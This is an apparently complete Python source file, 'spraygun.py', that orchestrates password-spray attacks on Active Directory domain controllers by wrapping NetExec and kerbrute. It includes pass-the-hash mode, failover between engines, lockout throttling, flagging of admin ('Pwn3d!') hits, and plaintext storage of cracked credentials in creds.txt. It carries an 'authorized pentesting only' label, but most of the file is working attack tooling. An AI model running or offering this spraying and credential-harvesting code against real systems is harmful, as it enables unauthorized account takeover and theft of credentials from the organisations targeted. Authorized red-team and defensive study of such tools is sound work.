#!/usr/bin/env python3
"""
spraygun.py — resilient password-spray orchestrator

For authorized penetration testing only. Wraps nxc (NetExec) and kerbrute
with preflight checks, failover between engines, lockout safety,
live rich UI, and state persistence for resumable sprays.

Dependencies:
    pip install rich

External tools (must be installed and on PATH, or override with --*-path):
    - nxc / netexec (https://github.com/Pennyw0rth/NetExec)
    - kerbrute (https://github.com/ropnop/kerbrute)
"""

import argparse
import dataclasses
import datetime
import enum
import fcntl
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Dict, Set, Optional, Tuple, Any

# Rich library for live terminal UI
try:
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.layout import Layout
    from rich.align import Align
    from rich import box
except ImportError:
    print("[!] rich library not installed. Run: pip install rich", file=sys.stderr)
    sys.exit(1)

# =============================================================================
# Dataclasses
# =============================================================================

@dataclass
class Config:
    """Run configuration from CLI args."""
    userfile: str
    passfile: str
    domain: str
    dc_ip: str
    tool: str = "kerbrute"
    protocol: str = "ldap"
    time_between_rounds: int = 35
    passwords_per_round: int = 2
    pth_mode: bool = False
    lockout_threshold: int = 2
    lockout_burst: int = 5
    conn_fail_limit: int = 10
    nxc_path: Optional[str] = None
    kerbrute_path: Optional[str] = None
    resume: bool = False
    dry_run: bool = False
    no_preflight: bool = False
    log_dir: str = "./spraygun-out"
    # Derived fields
    users: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    nxc_binary: str = ""
    kerbrute_binary: str = ""

@dataclass
class Engine:
    """Tool/protocol combination for failover chain."""
    tool: str  # "nxc" or "kerbrute"
    protocol: Optional[str] = None  # "smb" or "ldap" for nxc, None for kerbrute

    def __str__(self) -> str:
        if self.tool == "kerbrute":
            return "kerbrute"
        return f"nxc:{self.protocol}"

@dataclass
class RoundResult:
    """Results from spraying one password/hash with one engine."""
    successes: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret)
    admin_users: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret) - admin/pwn3d
    lockouts: Set[str] = field(default_factory=set)
    conn_fails: int = 0
    aborted: bool = False
    abort_reason: str = ""
    clean_finish: bool = False

# =============================================================================
# Classification pattern constants (version-agnostic, extensible)
# =============================================================================

class LineType(enum.Enum):
    SUCCESS = "SUCCESS"
    ADMIN = "ADMIN"  # Admin/high-privilege user (pwn3d!)
    LOCKOUT = "LOCKOUT"
    CONN_ERROR = "CONN_ERROR"
    AUTHFAIL = "AUTHFAIL"
    INFO = "INFO"

# nxc / netexec patterns
NXC_SUCCESS_PATTERNS = [r"\[\+\]"]  # netexec marks success with [+]

# Admin/pwn3d patterns - check AFTER success since pwn3d appears on success lines
NXC_ADMIN_PATTERNS = [
    r"\(Pwn3d!\)",           # Explicit pwn3d marker
    r"\[ADMIN\]",            # Admin status marker
    r"\*.*\*",               # Some versions highlight admins with asterisks
    r"Domain Admin",         # Explicit "Domain Admin" text
    r"Administrator",        # Built-in admin account
    r"admin.*privileged",    # Admin privilege indicators
]

NXC_LOCKOUT_PATTERNS = [
    r"LOCKED_OUT",
    r"account locked out",
    r"STATUS_ACCOUNT_LOCKED_OUT",
    r"locked out",
]
NXC_CONN_ERROR_PATTERNS = [
    r"timed out",
    r"NetBIOS",
    r"connection",
    r"unreachable",
    r"Failed to connect",
    r"SocketServer",
    r"Connection refused",
    r"Network unreachable",
    r"Host is down",
]
NXC_AUTHFAIL_PATTERNS = [
    r"STATUS_LOGON_FAILURE",
    r"STATUS_NO_SUCH_USER",
    r"\[-\].*Status:",
]

# kerbrute patterns
KERBRUTE_SUCCESS_PATTERNS = [r"\[\+\] VALID LOGIN:"]
KERBRUTE_LOCKOUT_PATTERNS = [
    r"locked",
    r"KDC_ERR_CLIENT_REVOKED",
    r"disabled",
]
KERBRUTE_CONN_ERROR_PATTERNS = [
    r"i/o timeout",
    r"deadline exceeded",
    r"connection refused",
    r"no such host",
    r"network unreachable",
]
KERBRUTE_AUTHFAIL_PATTERNS = [
    r"KDC_ERR_PREAUTH_REQUIRED",
    r"KRB_AP_ERR_SKEW",
    r"KDC_ERR_C_PRINCIPAL_UNKNOWN",
]

# =============================================================================
# RichUI: Live terminal panels
# =============================================================================

class RichUI:
    """Manages rich live UI: raw feed panel, summary panel, countdown."""

    def __init__(self, console: Console):
        self.console = console
        self.live: Optional[Live] = None
        self.raw_feed: List[str] = []
        self.max_feed_lines = 20
        self.current_phase = "idle"  # idle, spray, countdown, stopped
        self.phase_data: Dict[str, Any] = {}

    def start_spray(self, engine: Engine, secret: str, round_num: int):
        """Initialize the Live display for spray phase."""
        self.current_phase = "spray"
        self.phase_data = {
            "engine": str(engine),
            "secret": secret,
            "round": round_num,
            "successes": [],
            "admin_users": [],  # Track admin/pwn3d users separately for highlighting
            "lockouts": set(),
            "conn_fails": 0,
        }
        self.raw_feed = []
        self.live = Live(self._render_spray(), console=self.console, refresh_per_second=10)
        self.live.start()

    def feed_line(self, line: str):
        """Append a raw line to the feed (scrolling)."""
        if len(self.raw_feed) >= self.max_feed_lines:
            self.raw_feed.pop(0)
        self.raw_feed.append(line)
        self._update_display()

    def update_success(self, user: str, secret: str):
        """Register a credential hit."""
        self.phase_data["successes"].append((user, secret))
        self._update_display()

    def update_admin(self, user: str, secret: str):
        """Register an admin credential hit (pwn3d!)."""
        self.phase_data["admin_users"].append((user, secret))
        self._update_display()

    def update_lockout(self, user: str):
        """Register a lockout."""
        self.phase_data["lockouts"].add(user)
        self._update_display()

    def increment_conn_fails(self):
        """Register a connection failure."""
        self.phase_data["conn_fails"] += 1
        self._update_display()

    def set_abort(self, reason: str):
        """Show abort reason in summary."""
        self.phase_data["abort_reason"] = reason
        self._update_display()

    def _update_display(self):
        """Refresh the Live display."""
        if self.live and self.current_phase == "spray":
            self.live.update(self._render_spray())

    def _render_spray(self) -> Panel:
        """Render spray-phase panel."""
        summary = self._build_summary()
        feed = self._build_feed()
        layout = Layout()
        layout.split_column(
            Layout(summary, size=12),
            Layout(Panel(feed, title="Raw Feed", border_style="dim", box=box.SQUARE)),
        )
        return Panel(layout, title=f"[bold]Spraygun — Round {self.phase_data.get('round', '?')}[/bold]", border_style="blue")

    def _build_summary(self) -> Panel:
        """Build the summary panel."""
        engine = self.phase_data.get("engine", "N/A")
        secret_masked = "***" if self.phase_data.get("secret") else "N/A"
        successes = self.phase_data.get("successes", [])
        admin_users = self.phase_data.get("admin_users", [])
        lockouts = self.phase_data.get("lockouts", set())
        conn_fails = self.phase_data.get("conn_fails", 0)
        abort_reason = self.phase_data.get("abort_reason", "")

        grid = Table.grid(expand=True)
        grid.add_column()
        grid.add_column(justify="right")

        grid.add_row("[cyan]Engine:", engine)
        grid.add_row("[cyan]Secret (mask):", secret_masked)

        # Show admin users first with prominent styling
        if admin_users:
            grid.add_row("[red bold]ADMIN USERS [pwn3d!]:", str(len(admin_users)))
            for user, _ in admin_users[-5:]:  # Show last 5
                grid.add_row("", f"  [red bold]★[white] {user} [red](ADMIN)[/red]")

        grid.add_row("[green]Credentials found:", str(len(successes)))
        if successes:
            # Show regular successes (excluding admins shown above)
            admin_set = {u for u, _ in admin_users}
            regular_successes = [(u, s) for u, s in successes if u not in admin_set]
            for user, _ in regular_successes[-5:]:  # Show last 5
                grid.add_row("", f"  [green]✓[white] {user}")

        grid.add_row("[yellow]Lockouts:", str(len(lockouts)))
        if lockouts:
            for user in list(lockouts)[-5:]:
                grid.add_row("", f"  [yellow]![white] {user}")
        grid.add_row("[red]Connection failures:", str(conn_fails))
        if abort_reason:
            grid.add_row("[red]Aborted:", abort_reason)

        return Panel(grid, title="Summary", border_style="cyan")

    def _build_feed(self) -> str:
        """Build the raw feed text."""
        if not self.raw_feed:
            return "[dim]Waiting for tool output...[/dim]"
        # Last N lines with recent ones at top (reverse for display)
        lines_rev = self.raw_feed[::-1]
        # Colorize: red/bold for pwn3d/admin, green for [+] success, yellow for lockout keywords, red for error keywords
        colored = []
        for line in lines_rev:
            # Check for admin/pwn3d indicators first (highest priority)
            if any(kw in line for kw in ["(Pwn3d!)", "[ADMIN]", "Domain Admin", "Administrator"]):
                colored.append(f"[red bold]{line}[/red bold]")
            elif "[+]" in line or "VALID LOGIN" in line:
                colored.append(f"[green]{line}[/green]")
            elif any(kw in line.upper() for kw in ["LOCKED", "LOCKOUT", "REVOKED"]):
                colored.append(f"[yellow]{line}[/yellow]")
            elif any(kw in line for kw in ["timed out", "NetBIOS", "connection", "unreachable"]):
                colored.append(f"[red]{line}[/red]")
            else:
                colored.append(f"[dim]{line}[/dim]")
        return "\n".join(colored)

    def end_spray(self):
        """Stop the Live display after spray phase."""
        if self.live:
            self.live.stop()
            self.live = None
        self.current_phase = "idle"

    def countdown(self, seconds: int):
        """Show MM:SS countdown between rounds (summary + live timer)."""
        self.current_phase = "countdown"
        self.phase_data["countdown_remaining"] = seconds

        with Live(self._render_countdown(), console=self.console, refresh_per_second=1) as live:
            while seconds > 0:
                self.phase_data["countdown_remaining"] = seconds
                live.update(self._render_countdown())
                time.sleep(1)
                seconds -= 1

        self.current_phase = "idle"

    def _render_countdown(self) -> Panel:
        """Render countdown panel."""
        remaining = self.phase_data.get("countdown_remaining", 0)
        mins, secs = divmod(remaining, 60)
        countdown_str = f"{mins:02d}:{secs:02d}"

        layout = Layout()
        layout.split_column(
            Layout(self._build_summary()),
            Layout(Align.center(Text(f"[bold white on blue]  Time until next spray: {countdown_str}  [/bold white on blue]")))
        )
        return Panel(layout, title="[bold]Spraygun — Waiting[/bold]", border_style="blue")

    def alert(self, title: str, message: str, style: str = "yellow"):
        """Show a non-modal alert (use for hard-stops, preflight failures)."""
        self.console.print(Panel(message, title=title, border_style=style))
        self.console.print()

# =============================================================================
# State: Resume and persistence
# =============================================================================

class State:
    """Load/save run state for resumability."""

    def __init__(self, log_dir: str, cfg: Config):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.cfg = cfg

        self.state_file = self.log_dir / "spraygun.state.json"
        self.overall_log = self.log_dir / "spraygun-spray.log"
        self.creds_file = self.log_dir / "creds.txt"
        self.lockouts_file = self.log_dir / "locked-out.txt"
        self.used_file = self.log_dir / "used-passwords.txt"

        # Runtime state
        self.used_passwords: List[str] = []
        self.remaining_queue: List[str] = []
        self.found_creds: Dict[str, str] = {}
        self.locked_users: Set[str] = set()
        self.completed_rounds = 0

        if cfg.resume:
            self._load()
        else:
            self._init_queue()

    def _init_queue(self):
        """Initialize password queue from file (full list)."""
        self.remaining_queue = [p.strip() for p in self.cfg.passwords if p.strip()]

        # Write header to overall log
        self._log_line(f"=== Spraygun run started at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Config: tool={self.cfg.tool}, protocol={self.cfg.protocol}, pth={self.cfg.pth_mode}")
        self._log_line(f"Passwords in queue: {len(self.remaining_queue)}")
        self._log_line("")

    def _load(self):
        """Load existing state from resume."""
        if not self.state_file.exists():
            self._init_queue()
            return

        data = json.loads(self.state_file.read_text())
        self.used_passwords = data.get("used_passwords", [])
        self.found_creds = data.get("found_creds", {})
        self.locked_users = set(data.get("locked_users", []))
        self.completed_rounds = data.get("completed_rounds", 0)

        # Rebuild queue: all passwords minus used
        all_pw = [p.strip() for p in self.cfg.passwords if p.strip()]
        self.remaining_queue = [p for p in all_pw if p not in self.used_passwords]

        self._log_line(f"=== Resuming from saved state at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Used passwords: {len(self.used_passwords)}, remaining: {len(self.remaining_queue)}")
        self._log_line("")

    def save(self):
        """Persist state to disk."""
        data = {
            "used_passwords": self.used_passwords,
            "found_creds": self.found_creds,
            "locked_users": list(self.locked_users),
            "completed_rounds": self.completed_rounds,
        }
        self.state_file.write_text(json.dumps(data, indent=2))

        # Also write human-readable files
        if self.found_creds:
            creds_lines = [f"{user}:{secret}" for user, secret in self.found_creds.items()]
            self.creds_file.write_text("\n".join(creds_lines) + "\n")

        if self.locked_users:
            self.lockouts_file.write_text("\n".join(sorted(self.locked_users)) + "\n")

        if self.used_passwords:
            self.used_file.write_text("\n".join(self.used_passwords) + "\n")

    def record_spray_start(self, engine: Engine, secret: str, round_idx: int):
        """Log spray start header."""
        ts = datetime.datetime.now().isoformat()
        masked = "***"
        self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} round={round_idx} ===")

    def record_spray_end(self, successes: int, lockouts: int, conn_fails: int, aborted: bool, abort_reason: str = ""):
        """Log spray end trailer."""
        ts = datetime.datetime.now().isoformat()
        self._log_line(f"=== {ts} END successes={successes} lockouts={lockouts} conn_fails={conn_fails} aborted={aborted} reason={abort_reason} ===")
        self._log_line("")

    def add_cred(self, user: str, secret: str):
        """Record a found credential."""
        self.found_creds[user] = secret
        ts = datetime.datetime.now().isoformat()
        self._log_line(f"{ts} CREDENTIAL {user}:{secret}")
        self.save()

    def add_lockout(self, user: str):
        """Record a lockout."""
        self.locked_users.add(user)
        ts = datetime.datetime.now().isoformat()
        self._log_line(f"{ts} LOCKOUT {user}")
        self.save()

    def mark_used(self, secret: str):
        """Mark a password/hash as used."""
        self.used_passwords.append(secret)
        self.completed_rounds += 1
        self.save()

    def _log_line(self, line: str):
        """Append a line to the overall log."""
        with open(self.overall_log, "a") as f:
            f.write(line + "\n")

# =============================================================================
# Engine invocation and classification
# =============================================================================

def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
    """
    Classify a tool output line.
    Returns (LineType, extracted_data) where data depends on type:
    - SUCCESS: (user, secret) tuple as one string
    - LOCKOUT: username
    - Others: None
    """
    line_upper = line.upper()

    if engine.tool == "nxc":
        # Success
        for pat in NXC_SUCCESS_PATTERNS:
            if re.search(pat, line):
                # Extract DOMAIN\user:password
                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+):(\S+)", line)
                if m:
                    domain, user, secret = m.groups()
                    # Check if this is an admin/pwn3d user
                    for admin_pat in NXC_ADMIN_PATTERNS:
                        if re.search(admin_pat, line, re.IGNORECASE):
                            return (LineType.ADMIN, f"{user}:{secret}")
                    return (LineType.SUCCESS, f"{user}:{secret}")
        # Lockout
        for pat in NXC_LOCKOUT_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                # Try to extract username
                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
                if m:
                    return (LineType.LOCKOUT, m.group(2))
                else:
                    return (LineType.LOCKOUT, None)
        # Connection error (for failover counting)
        for pat in NXC_CONN_ERROR_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.CONN_ERROR, None)
        # Auth failure
        for pat in NXC_AUTHFAIL_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.AUTHFAIL, None)

    elif engine.tool == "kerbrute":
        # Success
        for pat in KERBRUTE_SUCCESS_PATTERNS:
            if re.search(pat, line):
                # Extract user@domain:password
                m = re.search(r"([A-Za-z0-9_\-\.@]+):(\S+)", line)
                if m:
                    user, secret = m.groups()
                    return (LineType.SUCCESS, f"{user}:{secret}")
        # Lockout (best-effort)
        for pat in KERBRUTE_LOCKOUT_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                m = re.search(r"([A-Za-z0-9_\-\.@]+)", line)
                if m:
                    return (LineType.LOCKOUT, m.group(1))
                else:
                    return (LineType.LOCKOUT, None)
        # Connection error
        for pat in KERBRUTE_CONN_ERROR_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.CONN_ERROR, None)
        # Auth failure
        for pat in KERBRUTE_AUTHFAIL_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.AUTHFAIL, None)

    return (LineType.INFO, None)

def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
    """
    Run one engine invocation for one password/hash. Stream stdout line-by-line,
    classify, update UI/state, and return RoundResult.
    Aborts early if conn_fails >= cfg.conn_fail_limit.
    """
    result = RoundResult()

    if cfg.dry_run:
        # Simulate tool output for --dry-run mode
        ui.feed_line(f"[DRY-RUN] Simulating {engine} with secret=***")

        # Simulate some fake lines based on round
        for i in range(5):
            fake_line = f"[{i}] [DRY-RUN] fake output line {i}"
            ui.feed_line(fake_line)
            line_type, data = classify_line(engine, fake_line)
            if line_type == LineType.SUCCESS:
                pass  # Not real
            elif line_type == LineType.LOCKOUT:
                pass
            elif line_type == LineType.CONN_ERROR:
                result.conn_fails += 1
                ui.increment_conn_fails()
                if result.conn_fails >= cfg.conn_fail_limit:
                    result.aborted = True
                    result.abort_reason = "conn-fail-limit (dry-run)"
                    ui.set_abort(result.abort_reason)
                    break
            time.sleep(0.1)

        result.clean_finish = not result.aborted
        return result

    # Build command
    cmd: List[str] = []

    if engine.tool == "nxc":
        binary = cfg.nxc_binary
        if not binary:
            ui.console.print("[!] nxc binary not found. Install netexec or override with --nxc-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        cmd = [binary]

        if engine.protocol == "smb":
            cmd.extend(["smb", cfg.dc_ip])
        elif engine.protocol == "ldap":
            cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])
        else:
            ui.console.print(f"[!] Invalid nxc protocol: {engine.protocol}", style="red")
            result.aborted = True
            result.abort_reason = "invalid-protocol"
            return result

        cmd.extend(["-u", cfg.userfile, "-H" if cfg.pth_mode else "-p", secret])
        cmd.append("--continue-on-success")

    elif engine.tool == "kerbrute":
        if cfg.pth_mode:
            ui.console.print("[!] PTH mode not supported with kerbrute; this should never happen in PTH failover chain", style="red")
            result.aborted = True
            result.abort_reason = "pth-kerbrute-incompatible"
            return result

        binary = cfg.kerbrute_binary
        if not binary:
            ui.console.print("[!] kerbrute binary not found. Install kerbrute or override with --kerbrute-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", cfg.domain, cfg.userfile, secret]

    else:
        ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
        result.aborted = True
        result.abort_reason = "unknown-engine"
        return result

    # Spawn subprocess
    ui.console.print(f"[*] Running: {' '.join(cmd[:3])}... (secret masked)", style="dim")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        # Stream output
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue

            # Log to overall log with timestamp
            ts = datetime.datetime.now().isoformat()
            state._log_line(f"{ts}  {line}")

            # Update UI raw feed
            ui.feed_line(line)

            # Classify
            line_type, data = classify_line(engine, line)

            if line_type == LineType.SUCCESS and data:
                user, secret_hit = data.split(":", 1)
                result.successes.append((user, secret_hit))
                ui.update_success(user, secret_hit)
                state.add_cred(user, secret_hit)

            elif line_type == LineType.ADMIN and data:
                user, secret_hit = data.split(":", 1)
                result.admin_users.append((user, secret_hit))
                # Also add to successes since it's a valid credential
                result.successes.append((user, secret_hit))
                ui.update_admin(user, secret_hit)
                state.add_cred(user, secret_hit)

            elif line_type == LineType.LOCKOUT:
                user_lock = data if data else "(unknown)"
                result.lockouts.add(user_lock)
                ui.update_lockout(user_lock)
                state.add_lockout(user_lock)

            elif line_type == LineType.CONN_ERROR:
                result.conn_fails += 1
                ui.increment_conn_fails()
                if result.conn_fails >= cfg.conn_fail_limit:
                    # Abort this engine invocation
                    proc.terminate()
                    try:
                        proc.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                    result.aborted = True
                    result.abort_reason = "conn-fail-limit"
                    ui.set_abort(result.abort_reason)
                    break

        # Wait for normal completion if not aborted
        if not result.aborted:
            return_code = proc.wait(timeout=10)
            result.clean_finish = (return_code == 0)

    except FileNotFoundError:
        ui.console.print(f"[!] Command not found: {cmd[0]}", style="red")
        result.aborted = True
        result.abort_reason = "command-not-found"

    except subprocess.TimeoutExpired:
        ui.console.print("[!] Subprocess timed out", style="red")
        result.aborted = True
        result.abort_reason = "timeout"

    except Exception as e:
        ui.console.print(f"[!] Exception running engine: {e}", style="red")
        result.aborted = True
        result.abort_reason = f"exception-{type(e).__name__}"

    return result

# =============================================================================
# Preflight check
# =============================================================================

def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
    """
    Perform preflight: reachability + domain validation.
    Returns (ok, detail_message).
    """
    if cfg.no_preflight or cfg.dry_run:
        return True, "Preflight skipped (--no-preflight or --dry-run)"

    ui.console.print("[*] Preflight check...", style="cyan")

    # 1. Reachability: socket connect to relevant ports
    ports_to_check = []
    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            ports_to_check = [445, 88]  # SMB + Kerberos
        elif cfg.protocol == "ldap":
            ports_to_check = [389, 636, 88]  # LDAP/LDAPS + Kerberos
    elif cfg.tool == "kerbrute":
        ports_to_check = [88]  # Kerberos

    reachable = False
    for port in ports_to_check:
        try:
            sock = socket.create_connection((cfg.dc_ip, port), timeout=3)
            sock.close()
            ui.console.print(f"  [+] Port {port} reachable", style="green")
            reachable = True
            break
        except (socket.timeout, ConnectionRefusedError, OSError):
            ui.console.print(f"  [-] Port {port} not reachable", style="dim")

    if not reachable:
        msg = f"DC {cfg.dc_ip} unreachable on ports {ports_to_check}"
        ui.alert("Preflight Failed", msg, "red")
        return False, msg

    # 2. Domain check: nxc probe (or kerbrute fallback)
    if cfg.nxc_binary:
        try:
            cmd = [cfg.nxc_binary]
            if cfg.protocol == "smb":
                cmd.extend(["smb", cfg.dc_ip])
            else:
                cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])

            # Quick probe without creds
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

            # Parse domain from output
            output = result.stdout + result.stderr
            # nxc reports domain/NetBIOS in various formats; do a fuzzy check
            domain_upper = cfg.domain.upper()
            if domain_upper in output.upper():
                ui.console.print(f"  [+] Domain '{cfg.domain}' confirmed in DC response", style="green")
                return True, "Preflight passed"
            else:
                msg = f"Domain '{cfg.domain}' not found in DC response (possible mismatch)"
                ui.console.print(f"  [-] {msg}", style="yellow")
                ui.console.print(f"     (DC may be reporting a different domain/NetBIOS name)", style="dim")
                ui.alert("Preflight Warning", msg + ". Continue at your own risk.", "yellow")
                return True, "Preflight passed with warning"  # Allow proceeding with a warning

        except subprocess.TimeoutExpired:
            msg = "nxc probe timed out"
            ui.console.print(f"  [-] {msg}", style="yellow")
            return True, "Preflight passed with warning"  # Continue
        except Exception as e:
            ui.console.print(f"  [-] nxc probe error: {e}", style="dim")
            # Fallback to just reachability check which already passed

    # Fallback for kerbrute-only: we already checked port 88, consider that enough
    ui.console.print("  [+] Preflight complete (reachability verified)", style="green")
    return True, "Preflight passed"

# =============================================================================
# Failover chain building
# =============================================================================

def build_failover_chain(cfg: Config) -> List[Engine]:
    """
    Build ordered, de-duplicated list of engines for failover.
    See plan: depends on starting tool + PTH mode.
    """
    if cfg.pth_mode:
        # PTH: nxc only, exclude kerbrute
        start_proto = cfg.protocol  # "smb" or "ldap"
        other_proto = "ldap" if start_proto == "smb" else "smb"
        return [
            Engine("nxc", start_proto),
            Engine("nxc", other_proto),
        ]

    # Normal mode
    chain = []

    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            chain = [
                Engine("nxc", "smb"),
                Engine("kerbrute"),
                Engine("nxc", "ldap"),
            ]
        elif cfg.protocol == "ldap":
            chain = [
                Engine("nxc", "ldap"),
                Engine("kerbrute"),
                Engine("nxc", "smb"),
            ]

    elif cfg.tool == "kerbrute":
        chain = [
            Engine("kerbrute"),
            Engine("nxc", "ldap"),
            Engine("nxc", "smb"),
        ]

    # De-duplicate (in case user passes weird combos)
    seen = set()
    unique_chain = []
    for eng in chain:
        key = (eng.tool, eng.protocol)
        if key not in seen:
            seen.add(key)
            unique_chain.append(eng)

    return unique_chain

# =============================================================================
# Lockout handling
# =============================================================================

def handle_lockouts(round_lockouts: int, cumulative_lockouts: int, cfg: Config, ui: RichUI, console: Console) -> bool:
    """
    Apply lockout rules. Returns True if run should continue, False if hard-stop.
    - Burst rule: >= cfg.lockout_burst in one round → hard-stop.
    - Threshold rule: >= cfg.lockout_threshold cumulative → interactive prompt.
    """
    if round_lockouts >= cfg.lockout_burst:
        msg = f"[!] Hard-stop: {round_lockouts} lockouts in this round (burst threshold {cfg.lockout_burst}). Stopping the run to avoid mass lockout."
        console.print(msg, style="red")
        ui.alert("LOCKOUT BURST - STOPPED", msg, "red")
        return False  # Do not continue

    if cumulative_lockouts >= cfg.lockout_threshold:
        msg = f"[*] Cumulative lockouts: {cumulative_lockouts} (threshold {cfg.lockout_threshold})."
        console.print(msg, style="yellow")
        return prompt_continue(ui, console)

    return True

def prompt_continue(ui: RichUI, console: Console) -> bool:
    """Interactive prompt: continue (c) or quit (q). Returns True to continue."""
    ui.alert("PAUSED", "Lockout threshold reached. Press 'c' to continue or 'q' to quit.", "yellow")

    while True:
        try:
            choice = input("Continue? [c/q]: ").strip().lower()
            if choice in ("c", "continue"):
                console.print("[*] Continuing...", style="green")
                return True
            elif choice in ("q", "quit", "exit"):
                console.print("[*] Quitting.", style="red")
                return False
            else:
                console.print("  Enter 'c' to continue or 'q' to quit.", style="dim")
        except (EOFError, KeyboardInterrupt):
            console.print("\n[*] Interrupted; quitting.", style="red")
            return False

# =============================================================================
# Signal handling
# =============================================================================

def setup_signal_handler(state: State, console: Console):
    """Register SIGINT handler to persist state on Ctrl-C."""
    def handler(signum, frame):
        console.print("\n[*] Interrupted. Saving state...", style="yellow")
        state.save()
        console.print("[*] State saved. You can resume with --resume.", style="green")
        sys.exit(130)  # Standard exit code for SIGINT

    signal.signal(signal.SIGINT, handler)

# =============================================================================
# Main run loop
# =============================================================================

def run(cfg: Config, console: Console):
    """Main spray loop."""
    ui = RichUI(console)

    # Preflight
    ok, detail = preflight(cfg, ui)
    if not ok:
        console.print(f"[!] Preflight failed: {detail}", style="red")
        console.print("[!] Aborting. Fix the issue or use --no-preflight to bypass (not recommended).", style="yellow")
        return

    # Initialize state
    state = State(cfg.log_dir, cfg)

    # Setup signal handler for Ctrl-C
    setup_signal_handler(state, console)

    # Build failover chain
    chain = build_failover_chain(cfg)
    console.print(f"[*] Failover chain: {' -> '.join(str(e) for e in chain)}", style="cyan")

    # Main loop over password queue
    round_idx = 0
    cumulative_lockouts = len(state.locked_users)

    while state.remaining_queue:
        # Take next batch
        batch = state.remaining_queue[:cfg.passwords_per_round]
        state.remaining_queue = state.remaining_queue[cfg.passwords_per_round:]

        console.print(f"\n[*] Round {round_idx + 1}: spraying {len(batch)} secret(s)", style="cyan")

        round_lockouts_this_round = 0

        for secret in batch:
            # Try each engine in failover chain
            engine_success = False
            for engine in chain:
                # Start spray UI
                ui.start_spray(engine, secret, round_idx + 1)
                state.record_spray_start(engine, secret, round_idx + 1)

                # Run spray
                result = spray_one_password(engine, cfg, secret, ui, state)

                # Record stats
                round_lockouts_this_round += len(result.lockouts)
                state.record_spray_end(
                    len(result.successes),
                    len(result.lockouts),
                    result.conn_fails,
                    result.aborted,
                    result.abort_reason
                )

                ui.end_spray()

                if result.aborted and "conn-fail-limit" in result.abort_reason:
                    console.print(f"[-] {engine} aborted due to connection failures; trying next in chain...", style="yellow")
                    continue  # Try next engine

                # Engine finished cleanly (or with partial results); move to next secret
                engine_success = True
                break  # Don't continue failover chain for this secret

            if not engine_success:
                console.print(f"[!] All engines failed for this secret. Pausing.", style="red")
                ui.alert("ALL ENGINES FAILED", "Could not spray this secret with any tool in the failover chain. Check network/DC. Press Enter to retry or Ctrl-C to abort.", "red")
                input()  # Pause for operator

        # Mark secrets as used
        for secret in batch:
            state.mark_used(secret)

        # Handle lockouts
        cumulative_lockouts = len(state.locked_users)
        should_continue = handle_lockouts(round_lockouts_this_round, cumulative_lockouts, cfg, ui, console)

        if not should_continue:
            console.print("[*] Run stopped due to lockout threshold.", style="yellow")
            break

        # Countdown if more passwords remain
        if state.remaining_queue:
            console.print(f"[*] Sleeping {cfg.time_between_rounds} minutes until next round...", style="cyan")
            ui.countdown(cfg.time_between_rounds * 60)

        round_idx += 1

    # Done
    console.print("\n[+] Spray complete.", style="green")
    console.print(f"[+] Found credentials: {len(state.found_creds)}", style="green")
    console.print(f"[+] Total lockouts: {len(state.locked_users)}", style="yellow")
    console.print(f"[+] Credentials saved to: {state.creds_file}", style="cyan")
    console.print(f"[+] Lockouts saved to: {state.lockouts_file}", style="cyan")
    console.print(f"[+] Overall log: {state.overall_log}", style="cyan")

# =============================================================================
# CLI entrypoint
# =============================================================================

def main():
    console = Console()

    parser = argparse.ArgumentParser(
        prog="spraygun.py",
        description="Spraygun — resilient password-spray orchestrator (authorized pentesting only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Plaintext password spray, kerbrute default
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 -t 35 --limit 2

  # nxc SMB mode with custom timing
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --tool nxc --protocol smb -t 30 --limit 1

  # Pass-the-hash mode (NTLM hashes)
  python3 spraygun.py -u users.txt -p hashes.txt -d LAB -dc-ip 10.10.10.10 --pth --tool nxc --protocol smb

  # Dry-run to verify UI/failover without a target
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --dry-run

  # Resume from a canceled run
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --resume

For authorized penetration testing only.
        """
    )

    parser.add_argument("-u", help="Userlist file (one per line)", required=True)
    parser.add_argument("-p", help="Password/hash file (one per line)", required=True)
